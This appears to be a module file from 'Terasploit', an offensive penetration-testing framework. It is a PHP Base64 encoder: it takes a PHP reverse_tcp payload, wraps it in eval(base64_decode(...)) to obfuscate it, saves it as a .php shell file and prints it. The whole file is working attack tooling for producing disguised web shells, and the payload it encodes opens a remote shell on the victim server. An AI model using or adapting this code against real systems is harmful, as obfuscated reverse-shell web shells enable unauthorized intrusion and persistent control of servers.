#######
# Module/Encoder: PHP Base64 Encoder
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.encoder import *

class TerasploitModule(Encoder):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {
                'Name'           : 'PHP Base64 Encoder',
                'Module'         : Module.encoder,
                'Arch'           : Arch.PHP,
                'Platform'       : Platform.PHP,
                'Payload'        : 'modules/payload/php/reverse_tcp',
                'Author'  : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description'    : [
                    'PHP Base64 Encoder'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('encoder',reset=True)


    def encode(self,payload,arch):
        if arch.lower() != Arch.PHP:
            info_print ('Failed to encode, invalid encoder.')
            return False

        encode = str(b64encode(bytes(payload, "utf-8")), "utf-8")

        return (
            "eval(base64_decode('{}'));".format(
                encode
            )
        ), True


    def run(self) -> tuple[str, bool]: 
        payload = Get.payload()[0].generate()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['PayloadHandler']

        info_print ('Encoding shell...')
        encoded_shell = self.encode(payload,payload_arch)
        if not encoded_shell:
            return 'done', True
        
        info_print ('Done encoding shell in base64, generating file...')
        shell, boolean = encoded_shell
        if boolean == True:
            self.generate_file(shell_name,payload_arch,shell)
            info_print (f'Saved as {shell_name}.php')
            for i in ['----',shell,'----']:
                print (i)
            return 'done', True
        if boolean == False:
            return 'done', True